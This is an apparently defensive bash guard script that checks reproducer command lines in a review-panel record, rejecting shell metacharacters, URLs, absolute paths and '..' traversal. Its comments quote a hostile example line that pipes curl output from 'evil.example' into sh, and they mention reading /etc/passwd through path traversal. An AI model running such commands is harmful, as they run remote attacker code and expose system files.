#!/usr/bin/env bash
# check-panel-reproducers.sh <worktree> <change-name>
#
# THE CHANGE NAME IS A SECOND ARGUMENT because the record is no longer at a
# fixed path. It is rendered to `docs/superpowers/reviews/<date>-<change>-panel.md`
# — one file per change in a directory shared by every change — so naming the
# worktree alone no longer names a record. panel_record_path in
# scripts/lib/panel-record.sh resolves it, and that function's comment is
# canonical for the anchored match and for why this guard no longer reads
# `.superpowers/sdd/final-review-panel.md`: that file survives as the pass log,
# which carries no marker block at all.
#
# Every finding in a panel record must declare how it was reproduced, so that
# /myflow-do can run that command and require it to FAIL before dispatching a
# fix instruction built on it. A finding with no runnable check declares the
# exemption form `none — <reason>` instead.
#
# Reads ONLY the two marker blocks. It never parses the findings table — not
# its header, not its column order, not where it starts or stops — for the
# same reason check-unfinished-work.sh does not: a hand-rolled table parser
# has repeatedly hidden an open finding behind a shape it was not written to
# recognise, while an anchored marker line has no cells to split, no
# escaping rule and no table boundary to track.
#
# Exit codes:
#   0  every F<n> named in the finding-status: block has exactly one
#      well-formed finding-reproducer: line, and reproducers-total equals
#      their number
#   1  violations found; each is reported on stderr
#   2  cannot answer at all — no worktree, no change name, a change name
#      outside the allowlist, no record, unreadable record
set -euo pipefail

export LC_ALL=C

# The banned-character set is single-sourced with run-reproducer.sh's own
# copy of the same check — see scripts/reproducer-metachars.sh's header for
# why: this set has already drifted between the two scripts twice.
SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd -P)"
# Readability is checked before the source, not left to `set -e` to catch a
# failed source. Without this, a missing or unreadable
# reproducer-metachars.sh made `source` itself fail, and `set -e` aborted the
# script at exit 1 — the same code this guard's own contract uses for
# "violations found". An empty banned-character set is correctly refused
# rather than silently run with nothing banned, but exit 1 told the caller
# the wrong story: "violations found" when the truthful answer is "cannot
# answer at all", this guard's own exit 2.
if [ ! -r "$SCRIPT_DIR/reproducer-metachars.sh" ]; then
  echo "check-panel-reproducers: cannot read $SCRIPT_DIR/reproducer-metachars.sh — cannot determine the banned-character set" >&2
  exit 2
fi
# shellcheck source=reproducer-metachars.sh
source "$SCRIPT_DIR/reproducer-metachars.sh"

# THE MARKER HELPERS (count_matching, grep_lines_of, ids_of) ARE DEFINED ONCE,
# in scripts/lib/panel-record.sh, sourced by this guard and by
# check-unfinished-work.sh — not reimplemented here. Same readability-before-
# source discipline as reproducer-metachars.sh above, and for the same
# reason: a missing or unreadable library must be this guard's own exit 2,
# "cannot answer at all", never exit 1's "violations found".
if [ ! -r "$SCRIPT_DIR/lib/panel-record.sh" ]; then
  echo "check-panel-reproducers: cannot read $SCRIPT_DIR/lib/panel-record.sh — cannot determine the marker helper definitions" >&2
  exit 2
fi
# shellcheck source=lib/panel-record.sh
source "$SCRIPT_DIR/lib/panel-record.sh"

WORKTREE="${1:-}"
NAME="${2:-}"
[[ -n "$WORKTREE" && -d "$WORKTREE" ]] || { echo "check-panel-reproducers: not a directory: ${WORKTREE:-<missing>}" >&2; exit 2; }
[[ -n "$NAME" ]] || { echo "usage: check-panel-reproducers.sh <worktree> <change-name>" >&2; exit 2; }

# CONTAINMENT, identical to check-unfinished-work.sh's own Protection 1. The
# change name arrives from a pull-request-editable state file and is
# concatenated into the record path below, so the same hazards apply here:
# `../../../planted` reads a record outside the worktree entirely, and a glob
# metacharacter reaches panel_record_path's `case` pattern.
#
# THE `case` BLOCK IS DUPLICATED, on purpose, in this guard and in
# check-unfinished-work.sh, whose own comment is canonical for the reasoning and
# for the measurement behind enumerating the characters rather than writing them
# as ranges. Both harnesses assert the same rejected shapes, which is what keeps
# the two copies from drifting apart silently, and a six-line containment check
# gains nothing from being centralized. `export LC_ALL=C` above already makes
# this copy byte-wise; the enumeration keeps it character for character the same
# rule as the other copies.
case "$NAME" in
  [!ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789]* \
  | *[!ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-]*)
    echo "check-panel-reproducers: change name '$NAME' is not a plain change name — it must start with a letter or digit and contain only letters, digits, '.', '_' and '-'" >&2
    exit 2
    ;;
esac
# Canonicalise to an absolute path before it is ever concatenated into a
# grep argument. A worktree argument that is a RELATIVE path beginning with
# `-` (`scripts/check-panel-reproducers.sh -dashy`, run from the directory
# that contains it) makes the record path built from it begin with `-` too,
# and every grep below would then parse that path as options rather than as
# a filename. `cd ... && pwd -P` always yields a path rooted at `/`, so this
# alone closes the hazard; the `--` separator added to every grep invocation
# below is defense in depth on top of it, not the whole of the fix. `pwd -P`
# rather than the bare builtin, matching scripts/run-reproducer.sh's own
# canonicalisation of the same variable: bash's `pwd` is logical by default
# and does not resolve a symlink in the path it printed, so on a symlinked
# worktree this guard's own `$WORKTREE` and the runner's later, physical
# resolution of the same worktree would disagree about what counts as
# "inside" it.
#
# The worktree is guarded a second time here, distinct from the existence
# check above: that check and this `cd` are two separate syscalls, and a
# worktree that vanishes in the gap between them (a concurrent cleanup, a
# race with another /myflow-finish run) makes `cd` fail after the `[[ -d ]]`
# check already passed. Without the `||` below, `set -e` forwards that
# failure as-is — the script exits with `cd`'s own exit status and bash's own
# "No such file or directory" message, never reaching this guard's own exit
# 2 and its own message. The `||` turns the assignment into a tested command,
# which `set -e` does not act on, so the guard's own exit 2 and message run
# instead.
WORKTREE="$(cd -- "$WORKTREE" && pwd -P)" || { echo "check-panel-reproducers: worktree vanished before it could be resolved: ${WORKTREE}" >&2; exit 2; }
PANEL="$(panel_record_path "$WORKTREE" "$NAME")"
# `-f` as well as `-r`: `-r` alone is true of a DIRECTORY, so a directory
# sitting where the record should be was read as a readable record and fell
# through every check below to REPRODUCERS-OK at exit 0. panel_record_path
# already skips a directory entry — mirroring records.existingDatedFile — so
# such a path arrives here as the empty string; the `-f` stays as the second
# half of that same refusal rather than as a duplicate of it.
[[ -n "$PANEL" && -f "$PANEL" && -r "$PANEL" ]] || { echo "check-panel-reproducers: no readable panel record for '$NAME' under $WORKTREE/$PANEL_RECORD_DIR — the rendered record is named <YYYY-MM-DD>-$NAME-panel.md" >&2; exit 2; }

VIOLATIONS=()
add() { VIOLATIONS+=("$1"); }

unreadable() {
  echo "check-panel-reproducers: cannot read $PANEL — cannot determine anything" >&2
  exit 2
}

# A NUL BYTE ANYWHERE IN THE PANEL RECORD IS REJECTED, checked here against
# the raw file rather than against anything already read into a bash
# variable. Bash cannot hold a NUL byte in a string at all — once a byte
# reaches `cmd_line`, `cmd_text`, or any value captured via `$(...)` or
# `read` below, the NUL is already gone, silently, with no error. A
# finding-reproducer: line carrying one would therefore read as ordinary text
# to every check further down, when it is actually a byte a direct exec
# would choke on. Isolating the check to only the reproducer block would mean
# reading raw bytes there and nowhere else in the file, which is more
# fragile than refusing any NUL in the record outright: a legitimate panel
# record is plain text end to end, and a NUL byte anywhere in it is a
# corruption signal, not a feature. `od -An -c` renders a NUL byte as the
# two-character text "\0" with no space between them, which a plain ERE can
# then match with no NUL ever passed through argv (bash cannot embed a NUL
# in an argument either); a literal backslash-then-zero typed by a human
# renders as two SEPARATE od fields with padding between them, so this does
# not fire on ordinary prose that happens to say "\0".
if od -An -c -- "$PANEL" | grep -q '\\0'; then
  add "the panel record contains a NUL byte — bash cannot hold one in a variable once read, and no legitimate record has a reason to carry one"
fi

# count_matching, grep_lines_of and ids_of are defined once in
# scripts/lib/panel-record.sh, sourced above, and not reimplemented here.
# `lines_of` and `full_lines_of` stay as this guard's own mode-bound call-site
# sugar — callers read better naming which shape they want — now forwarding to
# the library's `grep_lines_of` with the panel record as the file argument
# every other call site below also supplies explicitly.
lines_of() { grep_lines_of "$PANEL" match "$1"; }
full_lines_of() { grep_lines_of "$PANEL" line "$1"; }

# The identifiers of every line in the panel record matching a pattern,
# de-duplicated for use as a set (`ids-unique`, the shape this guard's
# comparisons need — see scripts/lib/panel-record.sh for why both shapes
# exist and neither is default).
STATUS_IDS="$(ids_of "$PANEL" '^finding-status: F[0-9]+ [^[:space:]]' ids-unique)" || unreadable
REPRO_IDS="$(ids_of "$PANEL" '^finding-reproducer: F[0-9]+ [^[:space:]]' ids-unique)" || unreadable

R_ANCHORED="$(count_matching "$PANEL" '^finding-reproducer: F[0-9]+ [^[:space:]]')" || unreadable
R_NAMED="$(count_matching "$PANEL" 'finding-reproducer:')" || unreadable
if [ "$R_NAMED" -ne "$R_ANCHORED" ]; then
  add "$((R_NAMED - R_ANCHORED)) line(s) naming finding-reproducer: that are not marker lines — a marker must begin its line, as 'finding-reproducer: F<n> <command | none — reason>'"
fi

# A WELL-FORMED LINE CARRIES EITHER A COMMAND TOKEN, OR THE LITERAL EXEMPTION
# `none — <reason>` WITH NON-SPACE TEXT AFTER THE EM DASH. The R_ANCHORED
# pattern above only demands some non-space character after the identifier,
# which a bare `none` with no reason satisfies — `finding-reproducer: F1
# none` reached REPRODUCERS-OK with nothing said about why no check runs.
# NONE_WORD counts every line whose reproducer text is the whole word `none`
# (followed by whitespace or end of line, so a command that merely starts
# with those four letters, such as `nonexistent-script`, is never counted:
# it is followed by a letter, not a word boundary). NONE_REASONED is the
# subset of those that go on to carry ` — ` and a reason. The difference
# between the two is exactly the bare-`none`-with-no-reason defect.
NONE_WORD="$(count_matching "$PANEL" '^finding-reproducer: F[0-9]+ none([[:space:]]|$)')" || unreadable
NONE_REASONED="$(count_matching "$PANEL" '^finding-reproducer: F[0-9]+ none — [^[:space:]]')" || unreadable
NONE_BARE=$((NONE_WORD - NONE_REASONED))
if [ "$NONE_BARE" -gt 0 ]; then
  add "$NONE_BARE reproducer line(s) declare 'none' with no reason — the exemption form is 'none — <reason>', not a bare 'none'"
fi

# A RUNNABLE REPRODUCER LINE'S COMMAND MUST BE A BARE PATH SHAPE, never a
# shell command line. /myflow-do runs a passing reproducer as a direct exec,
# with an argument vector, never through a shell (see skills/myflow-do/SKILL.md
# section 5) — but the record itself is subagent-authored text, exactly the
# kind of attacker-influenceable input this repository already treats a Jira
# summary or a `## standards` entry as, and nothing short of this guard stops
# a line such as `scripts/x.sh; curl http://evil.example/x | sh` from
# reaching REPRODUCERS-OK. Checked here, at record-validation time, rather
# than only in the runner's own prose constraint, so a malformed line is
# caught before it is ever a candidate to run.
#
# Every line whose reproducer text is not the `none` exemption is a command
# line and is checked. The check is deliberately separate rules rather than
# one broad pattern, so a violation names the shape it broke:
#   - no shell metacharacter anywhere on the line ( | ; & $ ` < > ( ) { }
#     ~ * ? [ ] # \ ) — a direct exec never expands any of these, so their
#     presence only ever means the author expected a shell to see them. `\`
#     is in this set for the same reason: a trailing backslash is a shell
#     line-continuation, which would otherwise put a following line outside
#     every check below it, and a mid-line backslash has no meaning to a
#     direct exec either.
#   - no leading `-` on the PATH TOKEN (the first whitespace-separated token
#     of the command) — bound to the path token alone, not to every token,
#     so an ordinary `script.sh --strict` is untouched; a path token
#     starting with `-` looks like an option to whatever runs it, never a
#     file
#   - no URL scheme anywhere on the line (`://`) — a reproducer names a path
#     inside the worktree, never a network location
#   - no ABSOLUTE token and no `..` PATH SEGMENT, on the path token or on any
#     argument after it. This is checked LEXICALLY, on the text of the line —
#     splitting it on whitespace and pattern-matching each resulting token —
#     and never touches the filesystem, for the same reason the rest of this
#     guard does not: the record is read in contexts where the worktree that
#     wrote it may not be the one this guard is running against (see below),
#     so there is nothing on disk this guard could safely resolve a path
#     against even if it wanted to. That means this rejects only the shapes
#     that CANNOT be contained inside ANY worktree, whichever one eventually
#     resolves them — an absolute path such as `/etc/passwd` names a location
#     outside every worktree by construction, and a `..` segment such as
#     `../../../etc/passwd` walks out of one. A relative path with no `..`
#     segment (`scripts/x.sh`, `../x` is rejected but `foo..bar.sh` is not,
#     since `..` there is not a path segment) still needs resolving against a
#     real worktree to know whether it stays inside — that resolution is
#     `skills/myflow-do/SKILL.md`'s own dispatch-time containment check, run
#     against the worktree that actually exists at dispatch time, not here.
#
# This never checks that the path exists on disk. The record is read in
# contexts where the worktree that wrote it may not be the one this guard is
# running against (a stale record copied for auditing, a record read from a
# different checkout), so existence is the caller's check at dispatch time,
# not this record's shape.
CMD_LINES="$(full_lines_of '^finding-reproducer: F[0-9]+ [^[:space:]]')" || unreadable
CMD_LINES="$(printf '%s\n' "$CMD_LINES" | grep -vE '^finding-reproducer: F[0-9]+ none([[:space:]]|$)' || true)"
if [ -n "$CMD_LINES" ]; then
  while IFS= read -r cmd_line; do
    [ -n "$cmd_line" ] || continue
    cmd_id="$(printf '%s\n' "$cmd_line" | grep -aoE 'F[0-9]+' | head -n1)"
    cmd_text="$(printf '%s\n' "$cmd_line" | sed -E 's/^finding-reproducer: F[0-9]+ //')"
    path_token="${cmd_text%% *}"
    case "$path_token" in
      -*)
        add "$cmd_id's reproducer command begins with a leading '-' on its path token ('$path_token') — a runnable reproducer names a path, never an option"
        ;;
    esac
    case "$cmd_text" in
      *'://'*)
        add "$cmd_id's reproducer command names a URL — a runnable reproducer is a bare path inside the worktree, never a network location"
        ;;
    esac
    # Split on whitespace via `read -ra`, not an unquoted `for tok in
    # $cmd_text` — the latter is subject to bash's own pathname expansion,
    # which would stat the filesystem looking for matches and is exactly the
    # filesystem touch this guard must not make.
    IFS=$' \t' read -ra cmd_tokens <<< "$cmd_text"
    for tok in "${cmd_tokens[@]}"; do
      case "$tok" in
        /*)
          add "$cmd_id's reproducer command carries an absolute token ('$tok') — a runnable reproducer names a path relative to the worktree, never an absolute path, on the path token or any argument"
          ;;
      esac
      case "$tok" in
        ..|../*|*/..|*/../*)
          add "$cmd_id's reproducer command carries a '..' path segment ('$tok') — a runnable reproducer must stay inside the worktree, on the path token or any argument"
          ;;
      esac
    done
    has_metachar=0
    metachars="$REPRODUCER_METACHARS"
    mc_i=0
    while [ "$mc_i" -lt "${#metachars}" ]; do
      mc_c="${metachars:$mc_i:1}"
      case "$cmd_text" in
        *"$mc_c"*) has_metachar=1 ;;
      esac
      mc_i=$((mc_i + 1))
    done
    if [ "$has_metachar" -eq 1 ]; then
      add "$cmd_id's reproducer command carries a shell metacharacter — a runnable reproducer is a bare path optionally followed by plain arguments, never a shell command line"
    fi
  done <<< "$CMD_LINES"
fi

# reproducers-total's DIGIT COUNT IS BOUNDED before anything touches it (15
# digits, comfortably inside every shell's 64-bit arithmetic), and the
# comparison against R_ANCHORED below is STRING equality rather than `-ne`.
# An earlier, unbounded pattern let a 26-digit total through, and `-ne` then
# died with "integer expression expected" inside the `if` — an error `set
# -e` does not see there, so the branch was skipped and a real mismatch went
# unreported at exit 0. String equality cannot fail to be performed by any
# digit string, however long, and the bound keeps a pathological value out
# of this check in the first place.
# T_NAMED (every line anchored `^reproducers-total:`, well-formed or not) is
# compared against T_WELLFORMED separately, mirroring the R_NAMED/R_ANCHORED
# split above for finding-reproducer: lines, and for the same reason: a
# malformed line such as `reproducers-total: 01` sitting beside a
# well-formed `reproducers-total: 1` made T_WELLFORMED alone equal to 1 —
# "exactly one well-formed line" was satisfied by the well-formed one, and
# the malformed duplicate passed unreported at exit 0 because nothing was
# ever counting lines that merely NAME reproducers-total: regardless of
# shape.
T_NAMED="$(count_matching "$PANEL" '^reproducers-total:')" || unreadable
T_WELLFORMED="$(count_matching "$PANEL" "^reproducers-total: ${PANEL_RECORD_TOTAL_DIGITS}[[:space:]]*\$")" || unreadable
if [ "$T_NAMED" -ne "$T_WELLFORMED" ]; then
  add "$((T_NAMED - T_WELLFORMED)) line(s) naming reproducers-total: that are not well-formed — a count line must read 'reproducers-total: <n>' with no leading zero and no sign"
fi
if [ "$T_WELLFORMED" -ne 1 ]; then
  add "the panel record must carry exactly one 'reproducers-total: <n>' line"
else
  DECLARED_LINE="$(grep -am1 -E -- "^reproducers-total: ${PANEL_RECORD_TOTAL_DIGITS}[[:space:]]*\$" "$PANEL")" || unreadable
  DECLARED="$(printf '%s\n' "$DECLARED_LINE" | grep -oE '[0-9]+')"
  if [ "$DECLARED" != "$R_ANCHORED" ]; then
    add "the panel record declares reproducers-total: $DECLARED but carries $R_ANCHORED finding-reproducer: marker line(s)"
  fi
fi

# THE MARKER LINES MUST BE ONE UNBROKEN BLOCK, mirroring
# check-unfinished-work.sh's own M_SPAN rule and for the same reason: signal
# two above (R_NAMED vs R_ANCHORED) has no notion of a block, so a
# finding-reproducer: line quoted inside a fenced example elsewhere in the
# record is counted like any other anchored line. Requiring the anchored
# lines to occupy consecutive lines closes the gap that count alone leaves
# open — a marker written anywhere else in the record cannot stand in for a
# missing one in the real block.
if [ "$R_ANCHORED" -gt 0 ]; then
  R_AT_RAW="$(grep -anE -- '^finding-reproducer: F[0-9]+ [^[:space:]]' "$PANEL")" || unreadable
  R_AT="$(printf '%s\n' "$R_AT_RAW" | cut -d: -f1)"
  R_SPAN=$(( ${R_AT##*$'\n'} - ${R_AT%%$'\n'*} + 1 ))
  if [ "$R_SPAN" -ne "$R_ANCHORED" ]; then
    add "the reproducer block's $R_ANCHORED marker line(s) are spread over $R_SPAN lines — they must be one unbroken block, so that a marker written elsewhere in the record cannot stand in for a missing one"
  fi
fi

DUPE_RAW="$(lines_of '^finding-reproducer: F[0-9]+')" || unreadable
if [ -n "$DUPE_RAW" ]; then
  DUPES="$(printf '%s\n' "$DUPE_RAW" | grep -aoE 'F[0-9]+' | sort | uniq -d | tr '\n' ' ')"
else
  DUPES=""
fi
DUPES="${DUPES% }"
[ -z "$DUPES" ] || add "the reproducer block reuses identifier(s) $DUPES — each F<n> must have exactly one reproducer line"

MISSING="$(comm -23 <(printf '%s\n' "$STATUS_IDS") <(printf '%s\n' "$REPRO_IDS") | tr '\n' ' ')"
MISSING="${MISSING% }"
EXTRA="$(comm -13 <(printf '%s\n' "$STATUS_IDS") <(printf '%s\n' "$REPRO_IDS") | tr '\n' ' ')"
EXTRA="${EXTRA% }"
[ -z "$MISSING" ] || add "finding(s) $MISSING carry no reproducer — each needs a 'finding-reproducer: F<n> …' line, or the exemption form 'none — <reason>'"
[ -z "$EXTRA" ] || add "reproducer line(s) name $EXTRA, which the finding-status block does not name"

if [ "${#VIOLATIONS[@]}" -gt 0 ]; then
  printf 'check-panel-reproducers: %s\n' "${VIOLATIONS[@]}" >&2
  exit 1
fi
echo "REPRODUCERS-OK ($R_ANCHORED finding(s) declared)"
